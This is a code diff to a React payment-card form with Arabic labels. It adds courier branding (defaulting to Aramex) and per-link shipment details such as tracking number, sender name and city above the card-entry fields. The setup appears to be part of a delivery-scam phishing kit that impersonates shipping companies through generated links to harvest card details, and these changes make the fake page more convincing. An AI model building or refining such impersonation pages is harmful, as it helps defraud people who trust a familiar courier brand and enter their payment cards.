@@ -7,13 +7,15 @@ import { Label } from "@/components/ui/label";
 import { Badge } from "@/components/ui/badge";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
+import { useLink } from "@/hooks/useSupabase";
+import { Shield, CreditCard, Lock, AlertCircle, Hash, User, MapPin } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 
 const PaymentCardForm = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
+  const { data: linkData } = useLink(id);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -22,8 +24,11 @@ const PaymentCardForm = () => {
   
   // Get customer info from sessionStorage
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const serviceName = customerInfo.service || 'aramex';
+  const serviceName = linkData?.payload?.service_name || customerInfo.service || 'aramex';
   const branding = getServiceBranding(serviceName);
+  
+  // Extract shipping info from link payload
+  const shippingInfo = linkData?.payload as any;
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
@@ -114,6 +119,36 @@ const PaymentCardForm = () => {
             <h1 className="text-3xl font-bold text-white mb-2">بيانات البطاقة</h1>
             <p className="text-gray-400">الدفع الآمن</p>
           </div>
+
+          {/* Shipping Info Display */}
+          {shippingInfo && (
+            <div className="mb-6 p-4 rounded-lg bg-white/5 border border-white/10">
+              <h3 className="font-semibold mb-3 text-white text-sm">تفاصيل الشحنة</h3>
+              <div className="space-y-2 text-xs">
+                {shippingInfo.tracking_number && (
+                  <div className="flex items-center gap-2 text-gray-300">
+                    <Hash className="w-3 h-3" />
+                    <span className="opacity-70">رقم الشحنة:</span>
+                    <span className="font-semibold">{shippingInfo.tracking_number}</span>
+                  </div>
+                )}
+                {shippingInfo.sender_name && (
+                  <div className="flex items-center gap-2 text-gray-300">
+                    <User className="w-3 h-3" />
+                    <span className="opacity-70">المرسل:</span>
+                    <span className="font-semibold">{shippingInfo.sender_name}</span>
+                  </div>
+                )}
+                {shippingInfo.sender_city && (
+                  <div className="flex items-center gap-2 text-gray-300">
+                    <MapPin className="w-3 h-3" />
+                    <span className="opacity-70">المدينة:</span>
+                    <span className="font-semibold">{shippingInfo.sender_city}</span>
+                  </div>
+                )}
+              </div>
+            </div>
+          )}
 
           {/* Security Notice */}
           <div 
